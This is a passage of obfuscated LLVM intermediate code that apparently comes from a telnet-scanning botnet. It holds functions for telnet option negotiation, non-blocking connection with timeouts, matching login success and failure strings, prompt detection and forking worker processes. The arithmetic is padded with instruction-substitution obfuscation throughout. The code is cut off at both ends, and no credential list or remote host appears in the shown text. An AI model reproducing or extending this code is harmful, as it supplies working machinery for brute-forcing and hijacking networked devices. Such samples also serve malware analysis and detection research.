  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %17, align 8
  store i8 %129, i8* %130, align 1
  %132 = load i8, i8* %16, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 10
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %128
  br label %143

; <label>:136:                                    ; preds = %128
  %137 = load i32, i32* %18, align 4
  %138 = sub i32 0, %137
  %139 = sub i32 0, 1
  %140 = add i32 %138, %139
  %141 = sub i32 0, %140
  %142 = add nsw i32 %137, 1
  store i32 %141, i32* %18, align 4
  br label %116

; <label>:143:                                    ; preds = %135, %116
  %144 = load i8*, i8** %17, align 8
  store i8 0, i8* %144, align 1
  %145 = load i32, i32* %18, align 4
  store i32 %145, i32* %4, align 4
  br label %146

; <label>:146:                                    ; preds = %143, %126
  %147 = load i32, i32* %4, align 4
  ret i32 %147
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = and i64 %37, %31
  %39 = xor i64 %37, %31
  %40 = or i64 %38, %39
  %41 = or i64 %37, %31
  store i64 %40, i64* %36, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sub i32 0, %42
  %44 = sub i32 0, 1
  %45 = add i32 %43, %44
  %46 = sub i32 0, %45
  %47 = add nsw i32 %42, 1
  %48 = call i32 @select(i32 %46, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %49 = icmp slt i32 %48, 1
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %58

; <label>:51:                                     ; preds = %27
  %52 = load i32, i32* %6, align 4
  %53 = load i8*, i8** %8, align 8
  %54 = load i32, i32* %9, align 4
  %55 = sext i32 %54 to i64
  %56 = call i64 @recv(i32 %52, i8* %53, i64 %55, i32 0)
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %5, align 4
  br label %58

; <label>:58:                                     ; preds = %51, %50
  %59 = load i32, i32* %5, align 4
  ret i32 %59
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %20, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, 1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, 1
  store i32 %14, i32* %6, align 4
  %16 = sext i32 %14 to i64
  %17 = getelementptr inbounds i8*, i8** %9, i64 %16
  %18 = load i8*, i8** %17, align 8
  %19 = icmp ne i8* %18, null
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %8
  br label %8

; <label>:21:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %22

; <label>:22:                                     ; preds = %37, %21
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* %6, align 4
  %25 = icmp slt i32 %23, %24
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %22
  %27 = load i8*, i8** %4, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8*, i8** %28, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %27, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %26
  store i32 1, i32* %3, align 4
  br label %43

; <label>:36:                                     ; preds = %26
  br label %37

; <label>:37:                                     ; preds = %36
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 0, 1
  %40 = sub i32 %38, %39
  %41 = add nsw i32 %38, 1
  store i32 %40, i32* %7, align 4
  br label %22

; <label>:42:                                     ; preds = %22
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %42, %35
  %44 = load i32, i32* %3, align 4
  ret i32 %44
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #13
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %112

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %100

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #13
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %98

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = and i64 %76, %70
  %78 = xor i64 %76, %70
  %79 = or i64 %77, %78
  %80 = or i64 %76, %70
  store i64 %79, i64* %75, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sub i32 %81, -1231629854
  %83 = add i32 %82, 1
  %84 = add i32 %83, -1231629854
  %85 = add nsw i32 %81, 1
  %86 = call i32 @select(i32 %84, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %87 = icmp sgt i32 %86, 0
  br i1 %87, label %88, label %96

; <label>:88:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %89 = load i32, i32* %6, align 4
  %90 = bitcast i32* %14 to i8*
  %91 = call i32 @getsockopt(i32 %89, i32 1, i32 4, i8* %90, i32* %13) #2
  %92 = load i32, i32* %14, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %112

; <label>:95:                                     ; preds = %88
  br label %97

; <label>:96:                                     ; preds = %66
  store i32 0, i32* %5, align 4
  br label %112

; <label>:97:                                     ; preds = %95
  br label %99

; <label>:98:                                     ; preds = %48
  store i32 0, i32* %5, align 4
  br label %112

; <label>:99:                                     ; preds = %97
  br label %100

; <label>:100:                                    ; preds = %99, %40
  %101 = load i32, i32* %6, align 4
  %102 = call i32 (i32, i32, ...) @fcntl(i32 %101, i32 3, i8* null)
  %103 = sext i32 %102 to i64
  store i64 %103, i64* %15, align 8
  %104 = load i64, i64* %15, align 8
  %105 = xor i64 -2049, -1
  %106 = xor i64 %104, %105
  %107 = and i64 %106, %104
  %108 = and i64 %104, -2049
  store i64 %107, i64* %15, align 8
  %109 = load i32, i32* %6, align 4
  %110 = load i64, i64* %15, align 8
  %111 = call i32 (i32, i32, ...) @fcntl(i32 %109, i32 4, i64 %110)
  store i32 1, i32* %5, align 4
  br label %112

; <label>:112:                                    ; preds = %100, %98, %96, %94, %39
  %113 = load i32, i32* %5, align 4
  ret i32 %113
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = sub i64 %11, 8003440404369380930
  %13 = add i64 %12, 1
  %14 = add i64 %13, 8003440404369380930
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 %16, -22729288502402464
  %18 = add i64 %17, 1
  %19 = add i64 %18, -22729288502402464
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = sub i64 %27, 3176621398641888407
  %29 = sub i64 %28, 1
  %30 = add i64 %29, 3176621398641888407
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %49

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 %44, -1219963701
  %46 = add i32 %45, 1
  %47 = add i32 %46, -1219963701
  %48 = add i32 %44, 1
  store i32 %47, i32* %4, align 4
  br label %24

; <label>:49:                                     ; preds = %24
  %50 = load i32, i32* %2, align 4
  %51 = load i32*, i32** %3, align 8
  %52 = load i64, i64* @numpids, align 8
  %53 = sub i64 %52, 2528955844043791985
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 2528955844043791985
  %56 = sub i64 %52, 1
  %57 = getelementptr inbounds i32, i32* %51, i64 %55
  store i32 %50, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #2
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %49, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %113, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %118

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, 2334998505739186891
  %30 = sub i64 %29, %28
  %31 = add i64 %30, 2334998505739186891
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %81, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = add i64 0, %44
  %46 = sub i64 0, %43
  %47 = getelementptr inbounds i8, i8* %41, i64 %45
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 32
  br i1 %50, label %81, label %51

; <label>:51:                                     ; preds = %37
  %52 = load i8*, i8** %3, align 8
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = add i64 0, 5370257682382605021
  %59 = sub i64 %58, %57
  %60 = sub i64 %59, 5370257682382605021
  %61 = sub i64 0, %57
  %62 = getelementptr inbounds i8, i8* %55, i64 %60
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 13
  br i1 %65, label %81, label %66

; <label>:66:                                     ; preds = %51
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = add i64 0, 4049062701537566734
  %74 = sub i64 %73, %72
  %75 = sub i64 %74, 4049062701537566734
  %76 = sub i64 0, %72
  %77 = getelementptr inbounds i8, i8* %70, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %66, %51, %37, %22
  %82 = phi i1 [ true, %51 ], [ true, %37 ], [ true, %22 ], [ %80, %66 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %91

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 %86, 1006387586
  %88 = add i32 %87, 1
  %89 = add i32 %88, 1006387586
  %90 = add nsw i32 %86, 1
